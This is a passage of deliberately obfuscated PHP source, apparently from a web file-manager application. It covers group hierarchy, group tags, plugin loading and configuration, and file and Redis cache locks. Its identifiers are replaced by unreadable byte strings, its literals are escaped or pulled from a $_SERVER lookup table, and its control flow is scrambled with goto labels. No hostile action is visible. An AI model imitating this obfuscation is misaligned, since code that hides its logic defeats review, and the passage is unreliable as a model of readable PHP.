(!$°€‹£´) { $ÌÂı”Óô[] = $øãİÚş[$Í¾Ô¾™ã]; } } return $ÌÂı”Óô; } protected function isParentOf($ªÜöÚğØ, $êğ‡¶Š) { $¹Î¦şÖ =& $_SERVER[¢ñàß¿€]; if (!$ªÜöÚğØ || !$êğ‡¶Š || $ªÜöÚğØ == $êğ‡¶Š) { return !1; } $¼š‹±î = $this->getInfoSimple($ªÜöÚğØ); $öÀšıË’ = $this->getInfoSimple($êğ‡¶Š); $‡à¹Š¨¤ = $¼š‹±î[$¹Î¦şÖ[584]] . $ªÜöÚğØ . $¹Î¦şÖ[50]; if (substr($öÀšıË’[$¹Î¦şÖ[584]], 0, strlen($‡à¹Š¨¤)) == $‡à¹Š¨¤) { return !0; } return !1; } public function groupShowRoot($ûİùã¾ş, $óïÇ¡’½ = false) { $×‡®À¢¸ =& $_SERVER[¢ñàß¿€]; $î¯Ê€ü‡ = $this->getInfo($ûİùã¾ş); if (!$î¯Ê€ü‡) { return array(); } $·¿¶ı±Ó = $this->parentLevelArray($î¯Ê€ü‡[$×‡®À¢¸[584]]); $õåŒ©ó = array($ûİùã¾ş); if (count($·¿¶ı±Ó) == 0) { return $õåŒ©ó; } if ($óïÇ¡’½ && count($·¿¶ı±Ó) == 1) { return $õåŒ©ó; } if (!$î¯Ê€ü‡[$×‡®À¢¸[539]] || !isset($î¯Ê€ü‡[$×‡®À¢¸[539]][$×‡®À¢¸[2058]]) || $î¯Ê€ü‡[$×‡®À¢¸[539]][$×‡®À¢¸[2058]] == $×‡®À¢¸[847]) { return $this->groupShowRoot($·¿¶ı±Ó[count($·¿¶ı±Ó) - 1], $óïÇ¡’½); } if ($î¯Ê€ü‡[$×‡®À¢¸[539]][$×‡®À¢¸[2058]] == $×‡®À¢¸[433]) { $‚†ñÊÅ = explode($×‡®À¢¸[50], $î¯Ê€ü‡[$×‡®À¢¸[539]][$×‡®À¢¸[2059]]); if ($‚†ñÊÅ) { $õåŒ©ó = array_merge($õåŒ©ó, $‚†ñÊÅ); } } return $õåŒ©ó; } protected function resetParentLevel() { $‘Ÿİ¢§ù =& $_SERVER[¢ñàß¿€]; $ºÀëÃË = $‘Ÿİ¢§ù[1968]; $¼¡Øº­Ù = $this->select(); $¼¡Øº­Ù = array_to_keyvalue($¼¡Øº­Ù, $ºÀëÃË); foreach ($¼¡Øº­Ù as $˜ôÒ´¢–) { $­ò™©ñ‘ = $˜ôÒ´¢–; $½ü‰ØöŞ = array(); while ($­ò™©ñ‘[$‘Ÿİ¢§ù[192]] != 0) { $½ü‰ØöŞ[] = $­ò™©ñ‘[$‘Ÿİ¢§ù[192]]; $­ò™©ñ‘ = $¼¡Øº­Ù[$­ò™©ñ‘[$‘Ÿİ¢§ù[192]]]; } $½ü‰ØöŞ[] = 0; $½ü‰ØöŞ = $‘Ÿİ¢§ù[50] . implode($‘Ÿİ¢§ù[50], array_reverse($½ü‰ØöŞ)) . $‘Ÿİ¢§ù[50]; $this->setNamePinyin($˜ôÒ´¢–[$ºÀëÃË], $˜ôÒ´¢–[$‘Ÿİ¢§ù[32]]); $this->where(array($ºÀëÃË => $˜ôÒ´¢–[$ºÀëÃË]))->save(array($‘Ÿİ¢§ù[652] => $½ü‰ØöŞ)); } return $¼¡Øº­Ù; } public function groupNameAuto($ úß²¯ã, $øÁ“‰æ) { $Óü²ïèí =& $_SERVER[¢ñàß¿€]; $§İ‘ªÚó = $this->where(array($Óü²ïèí[477] => $ úß²¯ã))->getField($Óü²ïèí[32], !0); if (!$§İ‘ªÚó || !in_array($øÁ“‰æ, $§İ‘ªÚó)) { return $øÁ“‰æ; } for ($äÀÙÉÃ = 1; $äÀÙÉÃ <= count($§İ‘ªÚó) + 1; $äÀÙÉÃ++) { $·”ö½Ø· = $øÁ“‰æ . "\50{$äÀÙÉÃ}\x29"; if (!in_array($·”ö½Ø·, $§İ‘ªÚó)) { return $·”ö½Ø·; } } } public function groupSwitch($ÌôÕ¢ïë, $û«ˆğ‘) { $ê¡®é¡ =& $_SERVER[¢ñàß¿€]; $ºèµÇ = array($ê¡®é¡[1968] => array($ê¡®é¡[7], array($ÌôÕ¢ïë, $û«ˆğ‘))); $¸üÈ»ıê = $this->where($ºèµÇ)->select(); $¸üÈ»ıê = array_to_keyvalue($¸üÈ»ıê, $ê¡®é¡[1968]); if (!isset($¸üÈ»ıê[$ÌôÕ¢ïë]) || !isset($¸üÈ»ıê[$û«ˆğ‘]) || $¸üÈ»ıê[$ÌôÕ¢ïë][$ê¡®é¡[192]] == 0) { return !1; } $ºèµÇ = array($ê¡®é¡[1968] => $ÌôÕ¢ïë); $ÈŒæ¾…† = Model($ê¡®é¡[2062])->where($ºèµÇ)->select(); if (!$ÈŒæ¾…†) { $ÈŒæ¾…† = array(); } foreach ($ÈŒæ¾…† as $ÕÕ°¿Ğã) { $¯šÊŒ¢† = $ÕÕ°¿Ğã[$ê¡®é¡[1770]]; $ºèµÇ = array($ê¡®é¡[1770] => $¯šÊŒ¢†, $ê¡®é¡[1968] => $û«ˆğ‘); $ò×ç¹¢ô = Model($ê¡®é¡[2062])->where($ºèµÇ)->find(); if (!$ò×ç¹¢ô) { $ÇòÃá¡… = array($û«ˆğ‘ => $ÕÕ°¿Ğã[$ê¡®é¡[2076]]); Model($ê¡®é¡[598])->userGroupAdd($¯šÊŒ¢†, $ÇòÃá¡…); } Model($ê¡®é¡[598])->userGroupRemove($¯šÊŒ¢†, $ÌôÕ¢ïë); } $ºèµÇ = array($ê¡®é¡[190] => 2, $ê¡®é¡[192] => 0, $ê¡®é¡[485] => 1, $ê¡®é¡[569] => array($ê¡®é¡[7], array($ÌôÕ¢ïë, $û«ˆğ‘))); $ı€ô‚å = Model($ê¡®é¡[895])->where($ºèµÇ)->field($ê¡®é¡[2077])->select(); $ı€ô‚å = array_to_keyvalue($ı€ô‚å, $ê¡®é¡[569], $ê¡®é¡[193]); $÷ÃÄğ¿ = !empty($ı€ô‚å[$ÌôÕ¢ïë]) ? $ı€ô‚å[$ÌôÕ¢ïë] : !1; if ($÷ÃÄğ¿) { if (!$ı€ô‚å[$û«ˆğ‘]) { $ı€ô‚å[$û«ˆğ‘] = Model($ê¡®é¡[895])->groupRootAdd($û«ˆğ‘); } $ÂŠ©Ú’Ú = $ı€ô‚å[$û«ˆğ‘]; $ºèµÇ = array($ê¡®é¡[192] => $÷ÃÄğ¿); $ı€ô‚å = Model($ê¡®é¡[895])->where($ºèµÇ)->field($ê¡®é¡[2078])->select(); if (!$ı€ô‚å) { $ı€ô‚å = array(); } Model($ê¡®é¡[895])->moveClearAuth = !1; foreach ($ı€ô‚å as $˜ÔıöÖ”) { $Å›å§ğ¢ = $˜ÔıöÖ”[$ê¡®é¡[485]] == $ê¡®é¡[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ê¡®é¡[895])->move($˜ÔıöÖ”[$ê¡®é¡[193]], $ÂŠ©Ú’Ú, $Å›å§ğ¢); } Model($ê¡®é¡[895])->moveClearAuth = !0; $ºèµÇ = array($ê¡®é¡[190] => 2, $ê¡®é¡[569] => $ÌôÕ¢ïë); $İŠ­ªïŒ = array($ê¡®é¡[569] => $û«ˆğ‘); Model($ê¡®é¡[2079])->where($ºèµÇ)->save($İŠ­ªïŒ); Model($ê¡®é¡[2080])->where($ºèµÇ)->save($İŠ­ªïŒ); } $this->_changeChildLevel($¸üÈ»ıê[$ÌôÕ¢ïë], $¸üÈ»ıê[$û«ˆğ‘], !0); $this->where(array($ê¡®é¡[192] => $ÌôÕ¢ïë))->save(array($ê¡®é¡[192] => $û«ˆğ‘)); $this->_clearChildrenCache($¸üÈ»ıê[$û«ˆğ‘]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ŠÌŸ’Ú») { $ƒæÄïÖğ =& $_SERVER[¢ñàß¿€]; return array($ƒæÄïÖğ[2081] => array($ŠÌŸ’Ú»[0], $ƒæÄïÖğ[2082]), $ƒæÄïÖğ[2083] => array($ŠÌŸ’Ú»[0], $ƒæÄïÖğ[2084])); } protected function get($ö…Ÿâäï) { $Ïíöòõğ =& $_SERVER[¢ñàß¿€]; $—…«‡©Ñ = Model($Ïíöòõğ[585])->metaGet($ö…Ÿâäï, $Ïíöòõğ[2085]); $¿ŠÍå÷‘ = json_decode($—…«‡©Ñ, !0); return $¿ŠÍå÷‘ ? $¿ŠÍå÷‘ : array($Ïíöòõğ[2086] => $Ïíöòõğ[91], $Ïíöòõğ[445] => array()); } protected function set($¼³ş€ã„, $Ç¼¨£›¬) { $ë¢Üß¢¡ =& $_SERVER[¢ñàß¿€]; $Ç¼¨£›¬ = $Ç¼¨£›¬ ? $Ç¼¨£›¬ : array($ë¢Üß¢¡[2086] => $ë¢Üß¢¡[91], $ë¢Üß¢¡[445] => array()); return Model($ë¢Üß¢¡[585])->metaSet($¼³ş€ã„, $ë¢Üß¢¡[2085], json_encode($Ç¼¨£›¬)); } protected function getByTagID($¾­Èû†û, $ÌÒ›±¦Ê) { $¨ÖçåóË =& $_SERVER[¢ñàß¿€]; if (!$¾­Èû†û || !$ÌÒ›±¦Ê) { return !1; } if (!Model($¨ÖçåóË[585])->getInfoSimple($¾­Èû†û)) { return !1; } $Ã›³—¸ = $this->get($¾­Èû†û); if (!$Ã›³—¸ || !isset($Ã›³—¸[$¨ÖçåóË[445]])) { return !1; } $À©²©¢ = array_find_by_field($Ã›³—¸[$¨ÖçåóË[445]], $¨ÖçåóË[475], $ÌÒ›±¦Ê); return is_array($À©²©¢) ? $À©²©¢ : !1; } public function listSource($§®£„ªÜ, $Ä¾òÇ‘ü) { $–ÃÃœí® =& $_SERVER[¢ñàß¿€]; if ($Ä¾òÇ‘ü && !is_array($Ä¾òÇ‘ü)) { $Ä¾òÇ‘ü = array($Ä¾òÇ‘ü); } $–¼¾ø” = $this->listData($§®£„ªÜ); $²™–³èï = array(); foreach ($–¼¾ø” as $Çö“…») { $ˆ¯ßÀ” = $Çö“…»[$–ÃÃœí®[87]]; if (!$ˆ¯ßÀ”) { continue; } if (!isset($²™–³èï[$ˆ¯ßÀ”])) { $²™–³èï[$ˆ¯ßÀ”] = array(); } $²™–³èï[$ˆ¯ßÀ”][] = $Çö“…»[$–ÃÃœí®[500]]; } $«‚–ú‡¤ = array(); foreach ($²™–³èï as $Ô……Ÿº => $ïÅ©Óò) { $»ÎØİË± = !0; if (!$Ä¾òÇ‘ü) { $«‚–ú‡¤[] = $Ô……Ÿº; continue; } foreach ($Ä¾òÇ‘ü as $ôóÚ´£) { if (!in_array($ôóÚ´£, $ïÅ©Óò)) { $»ÎØİË± = !1; break; } } if ($»ÎØİË±) { $«‚–ú‡¤[] = $Ô……Ÿº; } } if (!$«‚–ú‡¤) { return array(); } $š†«øúˆ = array($–ÃÃœí®[491] => array($–ÃÃœí®[492], $«‚–ú‡¤), $–ÃÃœí®[569] => $§®£„ªÜ, $–ÃÃœí®[190] => SourceModel::TYPE_GROUP); $ÚåãÇâç = Model($–ÃÃœí®[1414])->listSource($š†«øúˆ); if (!$ÚåãÇâç || count($«‚–ú‡¤) == $ÚåãÇâç[$–ÃÃœí®[442]][$–ÃÃœí®[443]]) { return $ÚåãÇâç; } $¨½Å’ŠÕ = array(); $µ‹€¶‡ = array_to_keyvalue($ÚåãÇâç[$–ÃÃœí®[85]], $–ÃÃœí®[12], $–ÃÃœí®[193]); $ä¨Ú‘‚ = array_to_keyvalue($ÚåãÇâç[$–ÃÃœí®[86]], $–ÃÃœí®[12], $–ÃÃœí®[193]); $ÍâÃ¥åô = array_merge($ä¨Ú‘‚, $µ‹€¶‡); foreach ($«‚–ú‡¤ as $ˆ¯ßÀ”) { if (!in_array($ˆ¯ßÀ”, $ÍâÃ¥åô)) { $¨½Å’ŠÕ[] = $ˆ¯ßÀ”; } } if ($¨½Å’ŠÕ) { $this->removeBySource($§®£„ªÜ, $¨½Å’ŠÕ); } return $ÚåãÇâç; } protected function listData($½ÎåîÉ„) { $¤ğ¶í¾´ =& $_SERVER[¢ñàß¿€]; $š±Ş½æ“ = array($¤ğ¶í¾´[1761] => 0, $¤ğ¶í¾´[557] => array($¤ğ¶í¾´[2087], 0), $¤ğ¶í¾´[496] => $¤ğ¶í¾´[2088] . $½ÎåîÉ„); $¬û‘Œ¯µ = $¤ğ¶í¾´[2089]; $ûÌŸáÅ = $this->field($¬û‘Œ¯µ)->where($š±Ş½æ“)->order($¤ğ¶í¾´[2090])->select(); return $ûÌŸáÅ ? $ûÌŸáÅ : array(); } protected function addToTag($—Äì‘Èì, $‡ç†Ö¸ñ, $…¢‚ÔßÕ) { $çõêÉé =& $_SERVER[¢ñàß¿€]; if (!$this->getByTagID($—Äì‘Èì, $…¢‚ÔßÕ) || !$‡ç†Ö¸ñ) { return !1; } if (!Model($çõêÉé[895])->pathInfo($‡ç†Ö¸ñ)) { return !1; } $­ÂŒ = array($çõêÉé[1761] => 0, $çõêÉé[557] => $…¢‚ÔßÕ, $çõêÉé[495] => $‡ç†Ö¸ñ, $çõêÉé[496] => $çõêÉé[2091] . $—Äì‘Èì, $çõêÉé[494] => $çõêÉé[12], $çõêÉé[1972] => 0); if ($this->where($­ÂŒ)->find()) { return !1; } return $this->add($­ÂŒ); } protected function removeFromTag($¯¼³½í, $áì¹ÓĞ, $£µÏ¡) { $‰æ›ßÆ =& $_SERVER[¢ñàß¿€]; if (!$this->getByTagID($¯¼³½í, $£µÏ¡) || !$áì¹ÓĞ) { return !1; } if (is_array($áì¹ÓĞ)) { $áì¹ÓĞ = array($‰æ›ßÆ[7], $áì¹ÓĞ); } $‹×ı—‘ı = array($‰æ›ßÆ[1761] => 0, $‰æ›ßÆ[557] => $£µÏ¡, $‰æ›ßÆ[496] => $‰æ›ßÆ[2091] . $¯¼³½í, $‰æ›ßÆ[495] => $áì¹ÓĞ); return $this->where($‹×ı—‘ı)->delete(); } protected function removeByTag($˜ƒßİ°, $ğŒ…İÓ‘) { $ÇÚ‰è›” =& $_SERVER[¢ñàß¿€]; if (!$this->getByTagID($˜ƒßİ°, $ğŒ…İÓ‘)) { return !1; } $ÊÃîÕú = array($ÇÚ‰è›”[1761] => 0, $ÇÚ‰è›”[557] => $ğŒ…İÓ‘, $ÇÚ‰è›”[496] => $ÇÚ‰è›”[2091] . $˜ƒßİ°); return $this->where($ÊÃîÕú)->delete(); } protected function removeBySource($’ãûë˜µ, $€¡ùş‰Â) { $’Àéœ¹ö =& $_SERVER[¢ñàß¿€]; if (!$’ãûë˜µ || !$€¡ùş‰Â) { return !1; } if (is_array($€¡ùş‰Â)) { $€¡ùş‰Â = array($’Àéœ¹ö[7], $€¡ùş‰Â); } $şÆ›€Ó¢ = array($’Àéœ¹ö[1761] => 0, $’Àéœ¹ö[495] => $€¡ùş‰Â, $’Àéœ¹ö[557] => array($’Àéœ¹ö[1089], 0), $’Àéœ¹ö[496] => $’Àéœ¹ö[2091] . $’ãûë˜µ); return $this->where($şÆ›€Ó¢)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\160\154\165\147\x69\x6e\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\163\x74\x61\164\x75\163", "\x72\145\x67\151\145\163\164", "\143\x6f\x6e\x66\x69\x67"); public function loadList($Óò÷‰ãğ = false) { $½ú»‰‰Ò = array_to_keyvalue($this->listData(), $_SERVER[¢ñàß¿€][32]); if ($Óò÷‰ãğ) { return $½ú»‰‰Ò[$Óò÷‰ãğ]; } return $½ú»‰‰Ò; } public function init() { $ÊÑ÷Ã‹ =& $_SERVER[¢ñàß¿€]; Hook::trigger($ÊÑ÷Ã‹[2092]); $‰òÖÚ» = $this->loadPluginList(); foreach ($‰òÖÚ» as $•ñéß±÷ => $Ó®Í›ğ) { $¤ºÒôî = $this->appAllow($•ñéß±÷, $Ó®Í›ğ); if (!$¤ºÒôî) { continue; } foreach ($Ó®Í›ğ[$ÊÑ÷Ã‹[2093]] as $¬Á¢õ– => $‰ßå³‚ã) { Hook::bind($¬Á¢õ–, $‰ßå³‚ã); } } Hook::trigger($ÊÑ÷Ã‹[2094]); Hook::trigger(ACTION); } public function appAllow($Ø†¡¶Ì, $Ìø‹°ë’, $¼¯·ÈÈ÷ = true) { $®É¥ĞØŸ =& $_SERVER[¢ñàß¿€]; $°˜ÄôÔ“ = PLUGIN_DIR . $Ø†¡¶Ì . $®É¥ĞØŸ[2095]; if (!is_array($Ìø‹°ë’) || !is_array($Ìø‹°ë’[$®É¥ĞØŸ[2093]]) || $Ìø‹°ë’[$®É¥ĞØŸ[821]] != 1 || !is_file($°˜ÄôÔ“)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$®É¥ĞØŸ[6]][$®É¥ĞØŸ[2096]] || !$GLOBALS[$®É¥ĞØŸ[6]][$®É¥ĞØŸ[2097]]) { return !0; } $‘ùÚ¡â´ = explode($®É¥ĞØŸ[50], strtolower($GLOBALS[$®É¥ĞØŸ[6]][$®É¥ĞØŸ[2097]])); return in_array(strtolower($Ø†¡¶Ì), $‘ùÚ¡â´) ? !1 : !0; } if ($¼¯·ÈÈ÷ && !Action($®É¥ĞØŸ[2098])->checkAuth($Ø†¡¶Ì)) { return !1; } return !0; } public function unInstall($ıÀÅ—ÎŠ) { $ñâ¤¢·Ã =& $_SERVER[¢ñàß¿€]; $Íù«ƒ¿è = $this->loadList($ıÀÅ—ÎŠ); if (file_exists(PLUGIN_DIR . $ıÀÅ—ÎŠ)) { Hook::apply($ıÀÅ—ÎŠ . $ñâ¤¢·Ã[2099]); } $this->remove($Íù«ƒ¿è[$ñâ¤¢·Ã[475]]); } public function changeStatus($ê½Öúà¢, $ƒ„îÖƒÓ) { $ ’’£Å =& $_SERVER[¢ñàß¿€]; $ÁÍî“…ı = $this->loadList($ê½Öúà¢); if ($ƒ„îÖƒÓ) { Hook::apply($ê½Öúà¢ . $ ’’£Å[2100]); } $this->update($ÁÍî“…ı[$ ’’£Å[475]], array($ ’’£Å[2101] => $ƒ„îÖƒÓ)); } public function appRegist($Â»ãÂñ, $€¯„²ì­) { $¤ƒ…ôÎÍ =& $_SERVER[¢ñàß¿€]; $…¤è™«è = $this->loadList($Â»ãÂñ); if ($…¤è™«è) { $this->update($…¤è™«è[$¤ƒ…ôÎÍ[475]], array($¤ƒ…ôÎÍ[2093] => $€¯„²ì­)); } else { $¬‡ŒØş’ = array($¤ƒ…ôÎÍ[32] => $Â»ãÂñ, $¤ƒ…ôÎÍ[2093] => $€¯„²ì­, $¤ƒ…ôÎÍ[821] => 0, $¤ƒ…ôÎÍ[6] => $this->getConfigDefault($Â»ãÂñ)); $this->insert($¬‡ŒØş’); } } public function getConfigDefault($µîªÌ‡) { $ˆÍüÁü =& $_SERVER[¢ñàß¿€]; $Ï‘œÛû‹ = array(); $ÁÉÔ…«õ = $this->getPackageJson($µîªÌ‡); if (!$ÁÉÔ…«õ && is_array($ÁÉÔ…«õ[$ˆÍüÁü[2102]])) { return $Ï‘œÛû‹; } foreach ($ÁÉÔ…«õ[$ˆÍüÁü[2102]] as $ÖŒ‡Ó£ => $´ª×éŞ) { if (!isset($´ª×éŞ[$ˆÍüÁü[450]]) || isset($Ï‘œÛû‹[$ÖŒ‡Ó£])) { continue; } $Ï‘œÛû‹[$ÖŒ‡Ó£] = $´ª×éŞ[$ˆÍüÁü[450]]; } return $Ï‘œÛû‹; } public function getPackageJson($Ûé×ìÁ) { return Hook::apply($Ûé×ìÁ . $_SERVER[¢ñàß¿€][2103]); } public function getConfig($Ê÷Âéë, $œ™”ïÁ¤ = false) { $ğÅ‘àÈĞ =& $_SERVER[¢ñàß¿€]; $ï¯ÒÓå = array(); $Œœ¸‡Ğ = $this->loadList($Ê÷Âéë); if ($Œœ¸‡Ğ && is_array($Œœ¸‡Ğ[$ğÅ‘àÈĞ[6]])) { $ï¯ÒÓå = $Œœ¸‡Ğ[$ğÅ‘àÈĞ[6]]; } if (!$ï¯ÒÓå || $œ™”ïÁ¤) { $ï¯ÒÓå = $this->getConfigDefault($Ê÷Âéë); } return $ï¯ÒÓå; } public function setConfig($º©áÙÇè, $“¯ÑÂé™ = false) { $ Ç¨É…¹ =& $_SERVER[¢ñàß¿€]; $õ¿Áà‰Î = $this->loadList($º©áÙÇè); if (!$õ¿Áà‰Î) { return !1; } $ïûÊœô¬ = $õ¿Áà‰Î[$ Ç¨É…¹[6]]; if ($“¯ÑÂé™ == !1) { $ïûÊœô¬ = array(); $“¯ÑÂé™ = $this->getConfigDefault($º©áÙÇè); } foreach ($“¯ÑÂé™ as $÷İÕÄ´ª => $·ÙÊîÆ²) { $ïûÊœô¬[$÷İÕÄ´ª] = is_string($·ÙÊîÆ²) ? trim($·ÙÊîÆ²) : $·ÙÊîÆ²; } $this->update($õ¿Áà‰Î[$ Ç¨É…¹[475]], array($ Ç¨É…¹[6] => $ïûÊœô¬)); } public function viewList() { $Ğ±÷×Äø =& $_SERVER[¢ñàß¿€]; $ãÍ©½Ÿ‚ = $this->loadList(); $this->pluginScan($ãÍ©½Ÿ‚); $ãÍ©½Ÿ‚ = $this->loadPluginList(); $Ü˜üöˆ£ = array(); foreach ($ãÍ©½Ÿ‚ as $ò¨„´© => $±àèŠ…) { $¸Ä²¨È = $±àèŠ…; unset($±àèŠ…[$Ğ±÷×Äø[2093]], $±àèŠ…[$Ğ±÷×Äø[6]]); $¹„âÅáÆ = PLUGIN_DIR . $±àèŠ…[$Ğ±÷×Äø[32]] . $Ğ±÷×Äø[2095]; if (!is_file($¹„âÅáÆ)) { continue; } $¾Õú›ı = Hook::apply($±àèŠ…[$Ğ±÷×Äø[32]] . $Ğ±÷×Äø[2103]); if (!is_array($¾Õú›ı)) { continue; } $Ü˜üöˆ£[$ò¨„´©] = array_merge($±àèŠ…, $¾Õú›ı); if ($¸Ä²¨È[$Ğ±÷×Äø[6]][$Ğ±÷×Äø[1684]] != $¾Õú›ı[$Ğ±÷×Äø[1658]]) { Hook::apply($±àèŠ…[$Ğ±÷×Äø[32]] . $Ğ±÷×Äø[2100]); $¸Ä²¨È[$Ğ±÷×Äø[6]][$Ğ±÷×Äø[1684]] = $¾Õú›ı[$Ğ±÷×Äø[1658]]; $this->update($±àèŠ…[$Ğ±÷×Äø[475]], array($Ğ±÷×Äø[6] => $¸Ä²¨È[$Ğ±÷×Äø[6]])); } } return $Ü˜üöˆ£; } private function loadPluginList() { $®¾ ‰÷õ =& $_SERVER[¢ñàß¿€]; $â³ßô´õ = $this->loadList(); if (strtolower(MOD) == $®¾ ‰÷õ[2104]) { return $â³ßô´õ; } $â‡ŒÍ÷Å = Hook::trigger($®¾ ‰÷õ[2105], $â³ßô´õ); if ($â³ßô´õ && !$â‡ŒÍ÷Å) { die; } return $â‡ŒÍ÷Å ? $â‡ŒÍ÷Å : $â³ßô´õ; } private function pluginScan($’Ü–®õÅ) { $æ™ÓÈÍ€ =& $_SERVER[¢ñàß¿€]; recursion_dir(PLUGIN_DIR, $¯ÀïŒŠø, $Û¤ÃÄŸè, 0); foreach ($¯ÀïŒŠø as $ÏÀ öú) { $¡ªòå´ = get_path_this($ÏÀ öú); if (isset($’Ü–®õÅ[$¡ªòå´]) || !file_exists($ÏÀ öú . $æ™ÓÈÍ€[2106]) || !file_exists($ÏÀ öú . $æ™ÓÈÍ€[2095])) { continue; } Hook::apply($¡ªòå´ . $æ™ÓÈÍ€[2100]); } } } goto d¶•ùÎƒçÒ; CÔÍÁøöí³: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¯»’‹Î¬ =& $_SERVER[¢ñàß¿€]; $ÔÍ¯ÙİÜ = $GLOBALS[$¯»’‹Î¬[6]][$¯»’‹Î¬[425]]; self::$cachePath = $ÔÍ¯ÙİÜ[$¯»’‹Î¬[230]][$¯»’‹Î¬[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($–¢Ø, $€ßİ±õ = 0) { $øäòÆÄâ =& $_SERVER[¢ñàß¿€]; $†ìƒ«Š = microtime(!0); $ñå¹·ÁÊ = $†ìƒ«Š + $€ßİ±õ + 0.0001; $øãÌôÔ§ = rtrim(self::$cachePath, $øäòÆÄâ[8]) . $øäòÆÄâ[934] . md5($–¢Ø) . $øäòÆÄâ[931]; if (file_exists($øãÌôÔ§) && filemtime($øãÌôÔ§) && filemtime($øãÌôÔ§) < time() - 10) { @unlink($øãÌôÔ§); } do { if (file_exists($øãÌôÔ§)) { cacheLockWait(); continue; } $Šï×âà = fopen($øãÌôÔ§, $øäòÆÄâ[935]); if (!$Šï×âà) { return !1; } $©¸ùÆ´ = flock($Šï×âà, LOCK_EX | LOCK_NB); self::$caches[$–¢Ø] = array($øäòÆÄâ[936] => $Šï×âà, $øäòÆÄâ[230] => $øãÌôÔ§); fwrite($Šï×âà, $ñå¹·ÁÊ); clearstatcache(); if ($Šï×âà && $©¸ùÆ´) { return !0; } cacheLockWait(); } while (microtime(!0) < $ñå¹·ÁÊ); $this->unlock($–¢Ø); return !1; } public function lockGet($Õ»á˜œ) { $¹ñŠ¡É¾ =& $_SERVER[¢ñàß¿€]; $•ã¸‹Û = rtrim(self::$cachePath, $¹ñŠ¡É¾[8]) . $¹ñŠ¡É¾[934] . md5($Õ»á˜œ) . $¹ñŠ¡É¾[931]; return file_exists($•ã¸‹Û); } public function unlock($¬ñÔğ¹Ì) { $ÂÀ³®Ü =& $_SERVER[¢ñàß¿€]; $Œ¶Ï³®› = self::$caches[$¬ñÔğ¹Ì]; if (!$Œ¶Ï³®›) { return; } @flock($Œ¶Ï³®›[$ÂÀ³®Ü[936]], LOCK_UN); @fclose($Œ¶Ï³®›[$ÂÀ³®Ü[936]]); @unlink($Œ¶Ï³®›[$ÂÀ³®Ü[230]]); unset(self::$caches[$¬ñÔğ¹Ì]); } } class CacheLockRedis { public function lock($ÌÊÒ•¢, $ş˜…æÆ = 10) { $Ö³‰ü– = Cache::init(); $¼…ù¸‘ = microtime(!0) + $ş˜…æÆ; while (microtime(!0) < $¼…ù¸‘) { $­îë»¹Î = $Ö³‰ü–->get($ÌÊÒ•¢); if (!$­îë»¹Î) { $¹¯äÎµ = $Ö³‰ü–->setLock($ÌÊÒ•¢, $¼…ù¸‘, $ş˜…æÆ); if ($¹¯äÎµ) { return !0; } } else { if ($­îë»¹Î < microtime(!0)) { $Ö³‰ü–->set($ÌÊÒ•¢, $¼…ù¸‘, $ş˜…æÆ * 2); if ($Ö³‰ü–->get($ÌÊÒ•¢) === $­îë»¹Î) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($‰…“ñ—) { return Cache::init()->get($‰…“ñ—); } public function unlock($†¤º­Ëâ) { return Cache::init()->remove($†¤º­Ëâ); } } goto C§ñÈÍÊì; EîÛØÃ¦ğ»: function binCheckBigger($¹¢ÍÈ¬ç, $ˆş›Ğ‘š) { return $¹¢ÍÈ¬ç > $ˆş›Ğ‘š; } $_SERVER[$_SERVER[íÏõøÍÈ][3]] = ("\70\65\60\70"."\67\62")+0;$_beit="tspbya2hq79w5g384k1rxl0dunoczie6vmfjqx28izgpu9hnvmc4owt6jl70esydark5b31fkrovi6pfj5";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ê˜ÂÕƒ, $ùâã›šœ) { $Ãíš÷ =& $_SERVER[¢ñàß¿€]; if (isset(self::$_methodList[$Ê˜ÂÕƒ])) { return @call_user_func_array(self::$_methodList[$Ê˜ÂÕƒ], $ùâã›šœ); } else { if (method_exists($this, $Ê˜ÂÕƒ)) { return call_user_func_array(array($this, $Ê˜ÂÕƒ), $ùâã›šœ); } else { think_exception(__CLASS__ . $Ãíš÷[4] . $Ê˜ÂÕƒ . $Ãíš÷[5]); } } } public static function __callStatic($éı¤»º¢, $ş­ûŸñ) { if (isset(self::$_methodListStatic[$éı¤»º¢])) { return call_user_func_array(self::$_methodListStatic[$éı¤»º¢], $ş­ûŸñ); } else { if (method_exists(self, $éı¤»º¢)) { return call_user_func_array(array(self, $éı¤»º¢), $ş­ûŸñ); } else { show_json("{$éı¤»º¢}\50\x29\40\156\x6f\x74\40\x65\x78\151\163\x74\x3b", !1); } } } public static function addMethod($Õ•àÕò, $õ¥şìë) { self::$_methodList[$Õ•àÕò] = $õ¥şìë; } public static function addMethodStatic($òš¢„ƒ, $¤¤¦Ó›Ï) { self::$_methodListStatic[$òš¢„ƒ] = $¤¤¦Ó›Ï; } } goto cÅğÚ™¨è; b¸æ¡Çäœ†: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x6a\x6f\x62\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x64\x65\163\x63", "\x73\157\x72\x74"); const JOB_KEY = "\x73\x65\154\146\112\x6f\x62\114\151\163\x74"; public function listData($±Æœ÷â­ = false, $Çº¿§¿„ = "\163\x6f\x72\164", $ä‹°ïéË = false) { return parent::listData($±Æœ÷â­, $Çº¿§¿„, $ä‹°ïéË); } public function remove($ö…²Ãâ) { return parent::remove($ö…²Ãâ); } public function add($øò˜§Ğ¦) { $±œš·¹… =& $_SERVER[¢ñàß¿€]; if ($this->findByName($øò˜§Ğ¦[$±œš·¹…[32]])) { return !1; } $øò˜§Ğ¦[$±œš·¹…[1992]] = $this->getSort(); return parent::insert($øò˜§Ğ¦); } private function getSort() { $êçÔÃÄ® =& $_SERVER[¢ñàß¿€]; $‘çù±§ï = parent::listData(); $ñÊ÷ªìŠ = array_to_keyvalue($‘çù±§ï, $êçÔÃÄ®[12], $êçÔÃÄ®[1992]); return empty($ñÊ÷ªìŠ) ? 0 : 